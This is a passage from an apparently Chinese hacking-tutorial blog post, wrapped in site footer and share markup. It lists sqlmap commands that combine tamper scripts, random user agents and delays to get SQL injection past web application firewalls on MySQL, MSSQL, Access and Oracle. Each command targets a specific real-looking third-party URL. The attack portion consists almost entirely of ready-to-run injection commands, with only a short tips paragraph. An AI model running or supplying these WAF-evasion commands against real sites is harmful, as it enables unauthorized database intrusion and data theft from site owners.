+<p>0x04脚本参数组合策略绕过<br>1 mysql绕过：<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –random-agent -v 2 -delay=3.5 –tamper=space2hash.py,modsecurityversioned.py<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –random-agent –hpp  –tamper=space2mysqldash.p,versionedmorekeywords.py<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  -delay=3.5  —-user-agent=” Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/38.0.696.12 Safari/534.24” –tamper=apostrophemask.py,equaltolike.py<br>备注：这些组合策略可以根据注入的反馈信息，及时调整组合策略<br>2 MSSQL：<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  -delay=3.5  —-user-agent=” Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/38.0.696.12 Safari/534.24” –tamper=randomcase.py,charencode.py<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –delay=3.5 –hpp –tamper=space2comment.py,randomcase.py<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –delay=3.5 –time-sec=120  –tamper=space2mssqlblank.py,securesphere.py<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –delay=3.5 –tamper=unionalltounion.py,base64encode.p<br>3 ms access:<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –delay=3.5 –random-agent  –tamper=appendnullbyte.py,space2plus.py<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –delay=3.5 –random-agent –hpp  –tamper=chardoubleencode.py<br>4 Oracle：<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –delay=5 –random-agent –hpp –tamper=unmagicquotes.py,unionalltounion.py<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –delay=5–user-agent =“Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0” –hpp –tamper=charunicodeencode.py,chardoubleencode.py<br>5 建议：<br>      因为WAF可能采用白名单规则，所以对于选择哪种策略，重点是根据-v 3 提示的信息进行判断，可以抓取主流的浏览器的user-agent ,s适当的延时，加上注入字符转换—大小写、空格、字符串、注释、加密等等方式<br>      鉴于参数和32种脚本，在我们平时的注入，这些通过不同的多重组合来进行测试，这个测试或者比较耗时</p>
+
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">GETAGGT IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/sqlmap/">sqlmap</a> <a class="tag tag--primary tag--small t-link" href="/tags/教程/">教程</a> <a class="tag tag--primary tag--small t-link" href="/tags/黑客/">黑客</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/14/hello-world/" data-tooltip="Hello World" aria-label="FRÜHER: Hello World">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/01/coolfire黑客入门教程/" data-tooltip="coolfire黑客入门教程" aria-label="NÄCHSTER: coolfire黑客入门教程">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2018 Lao k17. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/14/hello-world/" data-tooltip="Hello World" aria-label="FRÜHER: Hello World">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/01/coolfire黑客入门教程/" data-tooltip="coolfire黑客入门教程" aria-label="NÄCHSTER: coolfire黑客入门教程">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+    <i id="btn-close-shareoptions" class="fa fa-close"></i>
+    <ul class="share-options">
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i><span>Teilen auf Facebook</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/">
+                    <i class="fa fa-twitter" aria-hidden="true"></i><span>Teilen auf Twitter</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i><span>Teilen auf Google Plus</span>
+                </a>
+            </li>
+        
+    </ul>
+</div>
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <h4 id="about-card-name">Lao k17</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker"></i>
+                <br/>
+                China
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-xzfezjobyekpxrjktw5tz6muvzqfsbmo5n6atk3p5om9ulfptldi3p7cyqd8.min.js"></script>
+<!--SCRIPTS END-->
+
+    
+
+
+
+    </body>
+</html>
